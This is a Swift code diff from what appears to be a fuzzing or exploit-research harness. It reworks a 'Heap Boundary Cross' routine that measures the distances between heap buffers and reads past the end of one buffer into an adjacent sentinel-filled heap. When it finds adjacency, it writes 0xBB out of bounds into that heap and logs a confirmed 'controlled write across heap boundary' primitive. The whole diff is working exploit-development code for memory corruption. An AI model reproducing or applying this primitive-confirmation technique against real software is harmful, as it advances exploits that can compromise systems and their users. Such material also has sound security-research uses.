@@ -217,38 +217,49 @@ func runHeapBoundaryCross(log: FuzzLog, completion: @escaping () -> Void) {
         step("va1=0x\(String(va1,radix:16)) dist=0x\(String(va1>va0 ? va1-va0 : va0-va1, radix:16))")
         step("va2=0x\(String(va2,radix:16)) dist=0x\(String(va2>va1 ? va2-va1 : va1-va2, radix:16))")
 
-        // Clear all three heaps
+        // Compute distances — only probe pairs that are actually adjacent
+        let dist01 = va1 > va0 ? va1 - va0 : va0 - va1
+        let dist12 = va2 > va1 ? va2 - va1 : va1 - va2
+
+        // Fill h1 (victim) with sentinel
         for i in 0..<actual { p0[i] = 0x00; p1[i] = 0xAA; p2[i] = 0x00 }
-        step("h1 filled with 0xAA sentinel")
+        step("h1 filled 0xAA. dist01=0x\(String(dist01,radix:16)) dist12=0x\(String(dist12,radix:16))")
 
-        // Determine layout — find which heap is adjacent to h1
-        // Try writing one-past-end of h0 and one-past-end of h2
-        // If h0 is just before h1: p0[actual] == 0xAA (hits h1's byte 0)
-        // Use unsafe pointer arithmetic — raw memory access past buffer end
-        step("reading p0[actual] = p0[\(actual)] (one past h0 end)")
-        let v0end = p0[actual]   // UB but intentional — probing adjacent memory
-        step("p0[\(actual)] = 0x\(String(v0end, radix:16))")
+        // Only read p0[actual] if h0→h1 are contiguous (dist == actual)
+        if dist01 == UInt(actual) {
+            step("h0→h1 contiguous — reading p0[\(actual)]")
+            let v = p0[actual]
+            step("p0[\(actual)] = 0x\(String(v, radix:16))")
+            if v == 0xAA {
+                step("*** CROSS-HEAP READ: h0 OOB hits h1 ***")
+                // Write confirm: stamp 0xBB into h1 via h0 OOB
+                for i in 0..<64 { p0[actual + i] = 0xBB }
+                var hits = 0
+                for i in 0..<actual { if p1[i] == 0xBB { hits += 1 } }
+                step("*** CROSS-HEAP WRITE: \(hits)/64 bytes of h1 corrupted via h0 OOB ***")
+                if hits > 0 { step("*** PRIMITIVE CONFIRMED: controlled write across heap boundary ***") }
+            } else {
+                step("read 0x\(String(v,radix:16)) — not sentinel, layout shifted")
+            }
+        }
 
-        step("reading p2[actual] (one past h2 end)")
-        let v2end = p2[actual]
-        step("p2[\(actual)] = 0x\(String(v2end, radix:16))")
+        // Only read p2[actual] if h2→h1 are contiguous
+        if dist12 == UInt(actual) && (va2 < va1) {
+            step("h2→h1 contiguous — reading p2[\(actual)]")
+            let v = p2[actual]
+            step("p2[\(actual)] = 0x\(String(v, radix:16))")
+            if v == 0xAA {
+                step("*** CROSS-HEAP READ: h2 OOB hits h1 ***")
+                for i in 0..<64 { p2[actual + i] = 0xBB }
+                var hits = 0
+                for i in 0..<actual { if p1[i] == 0xBB { hits += 1 } }
+                step("*** CROSS-HEAP WRITE: \(hits)/64 bytes of h1 corrupted via h2 OOB ***")
+                if hits > 0 { step("*** PRIMITIVE CONFIRMED: controlled write across heap boundary ***") }
+            }
+        }
 
-        if v0end == 0xAA {
-            step("*** h0 is BEFORE h1 — p0[actual] hits h1's memory ***")
-            // Write cross-heap: stamp 0xBB into h1 via h0's OOB
-            for i in 0..<min(64, actual) { p0[actual + i] = 0xBB }
-            var hits = 0
-            for i in 0..<actual { if p1[i] == 0xBB { hits += 1 } }
-            step("*** CROSS-HEAP WRITE: stamped 0xBB via h0 OOB — h1 shows \(hits)/64 matches ***")
-        } else if v2end == 0xAA {
-            step("*** h2 is BEFORE h1 — p2[actual] hits h1's memory ***")
-            for i in 0..<min(64, actual) { p2[actual + i] = 0xBB }
-            var hits = 0
-            for i in 0..<actual { if p1[i] == 0xBB { hits += 1 } }
-            step("*** CROSS-HEAP WRITE: stamped 0xBB via h2 OOB — h1 shows \(hits)/64 matches ***")
-        } else {
-            step("no direct adjacency. p0end=0x\(String(v0end,radix:16)) p2end=0x\(String(v2end,radix:16))")
-            step("spray showed 0x4000 gap — may need interleaved alloc pattern to force layout")
+        if dist01 != UInt(actual) && !(dist12 == UInt(actual) && va2 < va1) {
+            step("no adjacent pair this run. dist01=0x\(String(dist01,radix:16)) dist12=0x\(String(dist12,radix:16))")
         }
 
         step("── Heap Boundary Cross complete ────────────")
